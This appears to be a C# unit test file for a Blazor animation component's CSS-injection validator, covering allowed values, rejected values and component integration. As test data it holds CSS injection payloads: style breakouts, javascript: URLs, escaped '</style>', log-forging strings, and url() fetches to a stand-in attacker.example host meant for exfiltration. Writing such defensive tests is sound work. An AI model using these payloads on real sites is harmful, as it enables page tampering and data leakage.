using Bit.Bmotion.Tests.TestInfra;
using Bunit;
using Microsoft.AspNetCore.Components;

namespace Bit.Bmotion.Tests.Engine;

/// <summary>Tests for the opt-in CSS-injection safe mode (plan item 3.4).</summary>
[TestClass]
public class CssValidatorTests
{
    // ── The validator ─────────────────────────────────────────────────────────

    [TestMethod]
    [DataRow("red")]
    [DataRow("#ff0000")]
    [DataRow("rgba(255, 0, 0, 0.5)")]
    [DataRow("50%")]
    [DataRow("2rem")]
    [DataRow("0 4px 8px rgba(0,0,0,0.2)")]
    [DataRow("blur(8px) brightness(1.2)")]
    [DataRow(null)]
    [DataRow("")]
    public void IsSafe_AllowsLegitimateValues(string? value)
        => Assert.IsTrue(BmotionCssValidator.IsSafe(value));

    [TestMethod]
    [DataRow("red; } body{display:none")]
    [DataRow("red;")]
    [DataRow("url(javascript:alert(1))")]
    [DataRow("expression(alert(1))")]
    [DataRow("red /* comment */")]
    [DataRow("</style>")]
    [DataRow("@import 'x'")]
    [DataRow("red\n color:blue")]
    [DataRow("url(\\6A avascript:alert(1))")] // CSS-escaped "javascript:"
    [DataRow("\\3C /style\\3E")]              // CSS-escaped "</style>"
    [DataRow("red\\;")]
    [DataRow("red\0blue")]
    [DataRow("red\tblue")]
    public void IsSafe_RejectsInjection(string value)
        => Assert.IsFalse(BmotionCssValidator.IsSafe(value));

    // A value that makes the browser fetch a URL lets untrusted input send requests anywhere (tracking, exfiltration).
    [TestMethod]
    [DataRow("url(https://attacker.example/t?u=victim)")]
    [DataRow("URL( 'https://attacker.example' )")]
    [DataRow("src(\"https://attacker.example\")")]
    [DataRow("image(\"https://attacker.example/a.png\")")]
    [DataRow("image-set(\"https://attacker.example/a.png\" 1x)")]
    [DataRow("-webkit-image-set(\"https://attacker.example/a.png\" 1x)")]
    [DataRow("linear-gradient(red, blue), url(//attacker.example)")]
    public void IsSafe_RejectsUrlFetches(string value)
        => Assert.IsFalse(BmotionCssValidator.IsSafe(value));

    [TestMethod]
    [DataRow("outline")]
    [DataRow("background-position")]
    [DataRow("letterSpacing")]
    [DataRow("--accent")]
    [DataRow("--my_var-2")]
    public void IsSafeName_AllowsPropertyNames(string name)
        => Assert.IsTrue(BmotionCssValidator.IsSafeName(name));

    [TestMethod]
    [DataRow("")]
    [DataRow("x;background-image:url(//evil);y")]
    [DataRow("--a:0;background:red;--b")]
    [DataRow("--a b")]
    [DataRow("color\n")]
    [DataRow("--a}")]
    public void IsSafeName_RejectsAnythingThatCanEndTheDeclaration(string name)
        => Assert.IsFalse(BmotionCssValidator.IsSafeName(name));

    [TestMethod]
    public void Quote_EscapesWhatCouldForgeALogLine()
    {
        var quoted = BmotionCssValidator.Quote("red\r\n[info] Admin login ok\u2028\u202Eevil");

        Assert.IsFalse(quoted.Any(c => char.IsControl(c) || c is '\u2028' or '\u202E'));
        Assert.AreEqual("red\\u000d\\u000a[info] Admin login ok\\u2028\\u202eevil", quoted);
    }

    [TestMethod]
    public void Quote_CutsAHugeValueShort()
    {
        var quoted = BmotionCssValidator.Quote(new string('a', 5_000_000));

        Assert.IsTrue(quoted.Length < 200, quoted);
        StringAssert.Contains(quoted, "5000000 characters");
    }

    // ── Integration with the component ────────────────────────────────────────

    private static RenderFragment Div => b =>
    {
        b.OpenElement(0, "div");
        b.CloseElement();
    };

    [TestMethod]
    public void ThrowMode_RejectsInjectedValue()
    {
        using var ctx = new BmotionTestContext();
        ctx.Options.CssSafeMode = BmCssSafeMode.Throw;

        Assert.ThrowsExactly<InvalidOperationException>(() =>
            ctx.Render<Bmotion>(ps => ps
                .Add(p => p.Animate, Bm.To(backgroundColor: "red; } body{display:none"))
                .Add(p => p.ChildContent, Div)));
    }

    [TestMethod]
    public void OffMode_AllowsAnyValue()
    {
        using var ctx = new BmotionTestContext(); // default Off
        // Should not throw even with a dangerous value.
        ctx.Render<Bmotion>(ps => ps
            .Add(p => p.Animate, Bm.To(backgroundColor: "red; } body{display:none"))
            .Add(p => p.ChildContent, Div));
    }

    [TestMethod]
    public void ThrowMode_AllowsCleanValue()
    {
        using var ctx = new BmotionTestContext();
        ctx.Options.CssSafeMode = BmCssSafeMode.Throw;
        // A legitimate color must pass.
        ctx.Render<Bmotion>(ps => ps
            .Add(p => p.Animate, Bm.To(backgroundColor: "#ff0000"))
            .Add(p => p.ChildContent, Div));
    }

    [TestMethod]
    public void ThrowMode_ProgrammaticSet_RejectsInjectedValue()
    {
        using var ctx = new BmotionTestContext();
        ctx.Options.CssSafeMode = BmCssSafeMode.Throw;
        var cut = ctx.Render<Bmotion>(ps => ps.Add(p => p.ChildContent, Div));

        // The imperative API must enforce safe mode just like the declarative Animate path.
        Assert.ThrowsExactly<InvalidOperationException>(() =>
            cut.Instance.Set(Bm.To(backgroundColor: "red; } body{display:none")));
    }
}
